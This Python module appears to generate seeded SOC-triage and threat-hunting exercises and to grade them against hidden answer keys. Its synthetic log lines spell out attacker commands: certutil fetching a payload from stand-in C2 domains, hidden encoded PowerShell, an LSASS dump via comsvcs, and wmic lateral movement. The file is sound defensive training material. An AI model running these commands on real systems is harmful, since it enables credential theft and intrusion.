"""Scenario generators + graders, keyed by each ranger's scenario seed.

The generator is a pure function of the seed, so the same seed reproduces the
same world and the same answer key. The key is produced here, on the server,
and never leaves it: candidates get the dataset with the key stripped, submit
their analysis, and the server re-derives the key from the seed to score them.
That is what keeps grading answer-free and un-gameable, and what makes a
returning ranger's different seed a genuinely different exercise.

Boards 1 (SOC triage) and 2 (threat hunting) are implemented here. Boards 3-6
follow the same shape: generate(seed) -> scenario, public_view(scenario),
score(scenario, sub).
"""
import datetime as _dt
import random as _random

# --- board 1: SOC triage ----------------------------------------------------
# GOAD-themed estate. Malicious alerts carry a technique whose raw log makes the
# technique determinable; benign alerts are low-severity noise.
_HOSTS = ["kingslanding", "winterfell", "castelblack", "meereen", "braavos", "dragonstone"]
_USERS = ["jon.snow", "arya.stark", "tyrion.lannister", "jaime.lannister",
          "cersei.lannister", "samwell.tarly", "brienne.tarth", "sansa.stark"]

# technique -> (id, how the raw log reads) so a diligent analyst can classify it.
_TP_TECHNIQUES = [
    ("T1110.003", "Password Spraying",
     "{n} failed NTLM logons across {m} accounts from {src} in 4 min, then 1 success for {user}"),
    ("T1078", "Valid Accounts",
     "Interactive logon for {user} from {src} at 03:1{d} (outside normal hours, no prior auth)"),
    ("T1021.002", "SMB / Admin Shares",
     "ADMIN$ share access on {dst} by {user} from {src}, followed by service creation"),
    ("T1003.001", "LSASS Memory",
     "Handle to lsass.exe opened by non-system process on {dst} (sekurlsa-style access) as {user}"),
    ("T1053.005", "Scheduled Task",
     "Scheduled task 'Updater' created on {dst} by {user} running a base64 powershell payload"),
    ("T1047", "Windows Management Instrumentation",
     "wmiprvse spawned cmd.exe on {dst} via remote WMI from {src} as {user}"),
]
_BENIGN = [
    "Password change for {user} via self-service portal",
    "New device enrollment for {user} (MDM)",
    "VPN login for {user} from a known corporate IP",
    "Windows Update installed KB50{d}321 on {dst}",
    "Scheduled backup job completed on {dst}",
    "Account {user} added to distribution group 'allstaff'",
]
_SEVERITIES = ["medium", "high", "critical"]


def _mkuser(login, host):
    return host.split(".")[0] + "\\" + login.split(".")[0]


def generate_board1(seed):
    r = _random.Random("board1:" + str(seed))
    n = r.randint(12, 16)
    attacker_user = r.choice(_USERS)
    attacker_src = r.choice(_HOSTS)
    base = _dt.datetime(2026, 3, r.randint(1, 20), r.randint(0, 5), r.randint(0, 59))
    tp_count = r.randint(4, 7)

    alerts = []
    for i in range(n):
        aid = "ALRT-%04d" % (1000 + i)
        ts = (base + _dt.timedelta(minutes=r.randint(0, 600))).isoformat()
        if i < tp_count:
            tid, tname, tmpl = r.choice(_TP_TECHNIQUES)
            dst = r.choice([h for h in _HOSTS if h != attacker_src])
            raw = tmpl.format(n=r.randint(18, 45), m=r.randint(6, 20), src=attacker_src,
                              dst=dst, user=attacker_user, d=r.randint(0, 9))
            key = {"verdict": "true_positive", "severity": r.choice(_SEVERITIES),
                   "technique": tid,
                   "iocs": sorted({attacker_src, _mkuser(attacker_user, dst)})}
            signal = tname
            host = dst
        else:
            victim = r.choice(_USERS)
            dst = r.choice(_HOSTS)
            raw = r.choice(_BENIGN).format(user=victim, dst=dst, d=r.randint(0, 9))
            key = {"verdict": "false_positive", "severity": "low",
                   "technique": None, "iocs": []}
            signal = "Routine activity"
            host = dst
        alerts.append({"id": aid, "timestamp": ts, "host": host,
                       "signal": signal, "raw": raw, "_key": key})
    r.shuffle(alerts)
    return {"board": 1, "cohort_theme": "sevenkingdoms.local",
            "attacker": {"src": attacker_src, "user": attacker_user},  # for the key only
            "alerts": alerts}


def public_board1(scenario):
    """The investigation surface: alerts with the answer key stripped."""
    return {"board": 1, "theme": scenario["cohort_theme"],
            "alerts": [{"id": a["id"], "timestamp": a["timestamp"], "host": a["host"],
                        "signal": a["signal"], "raw": a["raw"]} for a in scenario["alerts"]]}


def _norm(s):
    return (str(s or "").strip().lower())


def _ioc_overlap(sub, key):
    if not key:
        return 1.0 if not sub else 0.6  # no iocs expected; penalize spurious slightly
    subset = {_norm(x) for x in (sub or [])}
    keyset = {_norm(x) for x in key}
    if not keyset:
        return 1.0
    inter = len(subset & keyset)
    # recall of the real IOCs, lightly penalizing extras
    recall = inter / len(keyset)
    extra_pen = 0.1 * max(0, len(subset - keyset))
    return max(0.0, recall - extra_pen)


def score_board1(scenario, submission):
    """Score a triage submission against the hidden key. Returns
    (score_0_100, per_alert) where per_alert reveals correctness flags only,
    never the correct values."""
    key_by_id = {a["id"]: a["_key"] for a in scenario["alerts"]}
    sub_by_id = {}
    for a in (submission.get("alerts") or []):
        if isinstance(a, dict) and a.get("id"):
            sub_by_id[str(a["id"]).strip()] = a

    earned = 0.0
    total = 0.0
    per_alert = []
    for aid, key in key_by_id.items():
        is_tp = key["verdict"] == "true_positive"
        # weights: verdict 1.0, severity 0.4, technique 0.4 (TP only), iocs 0.2 (TP only)
        w_verdict, w_sev = 1.0, 0.4
        w_tech = 0.4 if is_tp else 0.0
        w_ioc = 0.2 if is_tp else 0.0
        total += w_verdict + w_sev + w_tech + w_ioc

        s = sub_by_id.get(aid, {})
        v_ok = _norm(s.get("verdict")) == key["verdict"]
        sev_ok = _norm(s.get("severity")) == _norm(key["severity"])
        tech_ok = (not is_tp) or (_norm(s.get("attack_technique")) == _norm(key["technique"]))
        ioc_ratio = _ioc_overlap(s.get("iocs"), key["iocs"]) if is_tp else 1.0

        earned += (w_verdict if v_ok else 0) + (w_sev if sev_ok else 0)
        earned += (w_tech if tech_ok else 0)
        earned += w_ioc * ioc_ratio
        per_alert.append({"id": aid, "verdict_correct": v_ok,
                          "severity_correct": sev_ok,
                          "technique_correct": (tech_ok if is_tp else None)})

    score = round(100.0 * earned / total, 1) if total else 0.0
    return score, per_alert


# --- board 2: threat hunting ------------------------------------------------
# A quiet corporate estate: no alert fired. The ranger is handed raw telemetry
# (process / auth / network / dns events) and must HUNT the intrusion out of a
# large benign baseline. Not flagging an event asserts it is benign, so the
# skill under test is detection with precision: find the whole kill chain
# without drowning in false leads. Scoring is class-balanced (F1 over the
# malicious set), so marking everything benign scores zero.
_B2_HOSTS = ["WKS-0471", "WKS-0088", "WKS-1120", "WKS-0233",
             "SRV-APP01", "SRV-FILE02", "SRV-SQL03", "SRV-DC01"]
_B2_USERS = ["m.okafor", "s.petrov", "l.nguyen", "d.reyes",
             "a.haddad", "k.yilmaz", "r.santos", "j.abara"]
_B2_C2 = ["cdn-telemetry-sync.com", "updates-cache-cdn.net", "api-metrics-collector.io",
          "static-assets-pool.co", "edge-node-telemetry.net", "mirror-pkg-delivery.net"]

# Kill-chain steps. {U} user, {H} patient-zero host, {dst} lateral target,
# {C2} attacker domain, {b64} encoded blob. Placeholders present in the detail
# drive the IOC set, so a hunter who pivots on the right entities is rewarded.
_B2_CHAIN = [
    ("T1059.001", "PowerShell (hidden, encoded)", "process",
     "winword.exe spawned powershell.exe -nop -w hidden -enc {b64} ({U} on {H})"),
    ("T1105", "Ingress Tool Transfer", "process",
     "certutil.exe -urlcache -split -f https://{C2}/update.bin on {H} by {U}"),
    ("T1087.002", "Account Discovery", "process",
     "{U} ran 'net group \"Domain Admins\" /domain' on {H}"),
    ("T1003.001", "LSASS Memory (comsvcs MiniDump)", "process",
     "rundll32.exe comsvcs.dll MiniDump <lsass-pid> full dump.bin ({U} on {H})"),
    ("T1047", "WMI Lateral Movement", "process",
     "wmic /node:{dst} process call create 'cmd /c update.bin' from {H} as {U}"),
    ("T1021.006", "WinRM Remote Session", "network",
     "WinRM 5985/tcp session {H} -> {dst} authenticated as {U} (no prior WinRM baseline)"),
    ("T1570", "Lateral Tool Transfer", "network",
     "SMB write to \\\\{dst}\\ADMIN$\\update.bin from {H} by {U}"),
    ("T1053.005", "Scheduled Task Persistence", "process",
     "schtasks /create /ru SYSTEM /tn 'MicrosoftEdgeUpdateX' /tr powershell on {H}"),
    ("T1071.001", "Web C2 Beaconing", "network",
     "{H} -> {C2}:443 HTTPS beacon every 60s, ~1.2KB, 8h duration, rare JA3"),
    ("T1048.003", "Exfiltration over DNS", "dns",
     "{H} -> {C2} 240 TXT lookups, high-entropy labels, ~3MB over 20m"),
]
_B2_BENIGN = [
    ("process", "{U} launched Outlook.exe on {H}"),
    ("process", "GoogleUpdate.exe ran maintenance task on {H}"),
    ("process", "Teams.exe autostarted for {U} on {H}"),
    ("process", "msedge.exe launched by {U} on {H}"),
    ("process", "python.exe ran the nightly report on {H}"),
    ("process", "OneDrive.exe sync for {U} on {H}"),
    ("auth", "{U} interactive logon to {H} from jump host SRV-JUMP01"),
    ("auth", "Kerberos TGT issued for {U} by SRV-DC01"),
    ("auth", "{U} unlocked workstation {H}"),
    ("network", "{H} -> windowsupdate.microsoft.com HTTPS"),
    ("network", "{H} -> outlook.office365.com HTTPS"),
    ("network", "{H} SMB read from \\\\SRV-FILE02\\shared"),
    ("dns", "{H} -> aka.ms A"),
    ("dns", "{H} -> teams.microsoft.com A"),
    ("dns", "{H} -> {dst}.corp.local A"),
]


def _b2_iocs(tmpl, U, H, dst, C2):
    """IOCs a hunter should pivot on, derived from what the detail references."""
    iocs = {"corp\\" + U.split(".")[-1], H}
    if "{dst}" in tmpl:
        iocs.add(dst)
    if "{C2}" in tmpl:
        iocs.add(C2)
    return sorted(iocs)


def generate_board2(seed):
    r = _random.Random("board2:" + str(seed))
    user = r.choice(_B2_USERS)
    host = r.choice([h for h in _B2_HOSTS if h.startswith("WKS")])  # patient zero
    dst = r.choice([h for h in _B2_HOSTS if h != host])
    c2 = r.choice(_B2_C2)
    base = _dt.datetime(2026, 4, r.randint(1, 20), r.randint(7, 18), r.randint(0, 59))

    # The intrusion: a coherent, contiguous subset of the kill chain (7-10 steps,
    # always starting at initial access) so every seed is a different hunt.
    tp_count = r.randint(7, 10)
    chain = _B2_CHAIN[:tp_count]
    benign_count = r.randint(38, 52)

    events = []
    # malicious events, spaced through a tight attack window
    for tid, tname, etype, tmpl in chain:
        detail = tmpl.format(U=user, H=host, dst=dst, C2=c2,
                             b64="JAB" + "".join(r.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
                                                 for _ in range(10)) + "==")
        key = {"verdict": "true_positive", "severity": r.choice(_SEVERITIES),
               "technique": tid, "iocs": _b2_iocs(tmpl, user, host, dst, c2)}
        events.append({"etype": etype, "user": user, "host": host,
                       "signal": tname, "detail": detail, "_key": key,
                       "_t": r.randint(0, 180)})
    # benign baseline across the whole estate and day
    for _ in range(benign_count):
        etype, tmpl = r.choice(_B2_BENIGN)
        bu = r.choice(_B2_USERS)
        bh = r.choice(_B2_HOSTS)
        bdst = r.choice([h for h in _B2_HOSTS if h != bh])
        detail = tmpl.format(U=bu, H=bh, dst=bdst)
        key = {"verdict": "false_positive", "severity": "low", "technique": None, "iocs": []}
        events.append({"etype": etype, "user": bu, "host": bh,
                       "signal": "Routine activity", "detail": detail, "_key": key,
                       "_t": r.randint(0, 1440)})

    r.shuffle(events)
    alerts = []
    for i, e in enumerate(events):
        ts = (base + _dt.timedelta(minutes=e["_t"])).isoformat()
        alerts.append({"id": "EVT-%04d" % (2000 + i), "timestamp": ts,
                       "host": e["host"], "user": e["user"], "event_type": e["etype"],
                       "signal": e["signal"], "detail": e["detail"], "_key": e["_key"]})
    return {"board": 2, "cohort_theme": "corp.local",
            "intrusion": {"user": user, "host": host, "dst": dst, "c2": c2},  # key only
            "alerts": alerts}


def public_board2(scenario):
    """The hunting surface: raw telemetry, no alerts, key stripped."""
    return {"board": 2, "theme": scenario["cohort_theme"],
            "alerts": [{"id": a["id"], "timestamp": a["timestamp"], "host": a["host"],
                        "user": a["user"], "event_type": a["event_type"],
                        "detail": a["detail"]} for a in scenario["alerts"]]}


def score_board2(scenario, submission):
    """Class-balanced hunt scoring. An omitted event is read as a benign call,
    so the score is F1 over the malicious set (find the whole chain without
    false leads) plus technique and IOC quality on confirmed finds. Marking
    everything benign scores 0. Feedback is correctness flags only."""
    key_by_id = {a["id"]: a["_key"] for a in scenario["alerts"]}
    sub_by_id = {}
    for a in (submission.get("alerts") or []):
        if isinstance(a, dict) and a.get("id"):
            sub_by_id[str(a["id"]).strip()] = a

    truth_tp = {i for i, k in key_by_id.items() if k["verdict"] == "true_positive"}
    called_tp = set()
    per_alert = []
    for aid, key in key_by_id.items():
        s = sub_by_id.get(aid, {})
        verdict = _norm(s.get("verdict")) or "false_positive"  # omitted => benign
        is_tp = key["verdict"] == "true_positive"
        v_ok = verdict == key["verdict"]
        sev_ok = _norm(s.get("severity")) == _norm(key["severity"])
        tech_ok = (not is_tp) or (_norm(s.get("attack_technique")) == _norm(key["technique"]))
        if verdict == "true_positive":
            called_tp.add(aid)
        per_alert.append({"id": aid, "verdict_correct": v_ok, "severity_correct": sev_ok,
                          "technique_correct": (tech_ok if is_tp else None)})

    found = called_tp & truth_tp
    recall = len(found) / len(truth_tp) if truth_tp else 1.0
    precision = (len(found) / len(called_tp)) if called_tp else (1.0 if not truth_tp else 0.0)
    f1 = (2 * precision * recall / (precision + recall)) if (precision + recall) else 0.0

    tech_q, ioc_q = [], []
    for aid in found:
        key, s = key_by_id[aid], sub_by_id.get(aid, {})
        tech_q.append(1.0 if _norm(s.get("attack_technique")) == _norm(key["technique"]) else 0.0)
        ioc_q.append(_ioc_overlap(s.get("iocs"), key["iocs"]))
    tech_score = (sum(tech_q) / len(tech_q)) if tech_q else 0.0
    ioc_score = (sum(ioc_q) / len(ioc_q)) if ioc_q else 0.0

    score = round(100.0 * (0.70 * f1 + 0.20 * tech_score + 0.10 * ioc_score), 1)
    return score, per_alert


# --- dispatch ---------------------------------------------------------------
_GENERATORS = {
    1: (generate_board1, public_board1, score_board1),
    2: (generate_board2, public_board2, score_board2),
}


def has_board(n):
    return n in _GENERATORS


def dataset(n, seed):
    gen, pub, _ = _GENERATORS[n]
    return pub(gen(seed))


def grade(n, seed, submission):
    gen, _, scorer = _GENERATORS[n]
    return scorer(gen(seed), submission)
